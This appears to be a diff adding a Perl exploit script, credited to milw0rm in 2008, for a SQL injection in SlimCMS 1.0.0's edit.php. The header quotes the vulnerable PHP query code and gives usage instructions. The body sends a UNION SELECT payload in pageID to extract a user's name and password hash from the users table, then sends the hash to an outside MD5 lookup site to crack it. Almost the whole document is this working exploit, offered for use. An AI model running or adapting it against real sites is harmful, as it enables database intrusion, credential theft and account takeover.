@@ -1,0 +1,118 @@
+#!/usr/bin/perl
+
+=starting
+
+ --------------------------------------------------------
+ SlimCMS <= 1.0.0 (edit.php) Remote SQL Injection Exploit
+ --------------------------------------------------------
+ by athos - staker[at]hotmail[dot]it
+ 
+ download on sourceforge 
+ 
+ 
+ File edit.php
+ 
+ 111. if ($password == md5($_POST['password']))
+ 112. {
+ 113.    if (strlen($_POST['cmsText']) > 2) {
+ 114. $query  = "UPDATE pages SET title = '".$_POST['pageTitle']."', content =  '".
+      strip_tags(stripslashes($_POST['cmsText']),$allowedTags)."' WHERE ID = ".$_GET['pageID'];
+ 115. mysql_query($query);
+ 116. //$successfulyUpdated
+ 117. responseText = $successfulyUpdated;
+ 118. }
+ 119.
+ 120. if (strlen($_GET['pageID']) > 0) {
+ 121. $query  = "SELECT * FROM pages WHERE ID = ".$_GET['pageID'];
+ 122. $result = mysql_query($query);
+ 123.
+ 124.				
+ 125. while($row = mysql_fetch_array($result)) {
+ 126.	$pageTitle = $row['title'];
+ 127.	$pageContent = $row['content'];
+ 128.  }
+ 129. }
+ 
+ NOTE: Works Regardless PHP.ini Settings!
+ 
+  
+  you must be logged..
+  
+  Usage: perl "exploit.pl" [HOST] [username:password] [USER_ID]
+  
+  Output: Username: athos
+          Password: 27e43424d53719a645ae7cca038b45be
+ 
+ 
+
+=cut
+
+use strict;
+use LWP::UserAgent;
+use LWP::Simple;
+
+my $match = q{Editing page "(.+?)"};
+my $http = new LWP::UserAgent; 
+my $post = undef;
+my @login = ();
+my @out = ();
+
+my ($host,$auth,$myid) = @ARGV;
+
+unless($host =~ /http:\/\/(.+?)$/i && $auth && $myid)
+{
+    print STDOUT "Usage: perl $0 [host/path] [username:password] [id]\r\n"; 
+    exit;
+} 
+
+$host .= "/edit.php?pageID=-1 union select 1,concat(username,0x3a,password),3,4 from users where id=$myid#";
+
+@login = split(':',$auth);
+
+$post = $http->post($host,[ 
+                            username => $login[0],
+                            password => $login[1],
+                         ]);
+
+
+if($post->is_success && $post->content =~ $match) 
+{
+    @out = split(':',$1);
+   
+    if($#out => 2)
+    {
+        my $cracked = search_MD5($out[1]);
+        
+        print STDOUT "Username: $out[0]\r\n";
+        print STDOUT "Password: $out[1] -> $cracked\r\n";
+        exit;  
+   }
+   else
+   {
+       print STDOUT "Exploit Failed!\r\n";
+       print STDOUT "Login incorrect or site not vulnerable\\available!\r\n";
+       exit;
+   }
+}
+
+
+sub search_MD5
+{
+    my $hash = shift @_;
+    my $cont = undef;
+
+    $cont = get('http://md5.rednoize.com/?p&s=md5&q='.$hash);
+        
+    if(length($hash) => 32 && !is_error($cont))
+    {
+        return $cont;
+    }
+    else
+    {
+        return exit;
+    }
+}   
+    
+__END__
+
+# milw0rm.com [2008-11-14]
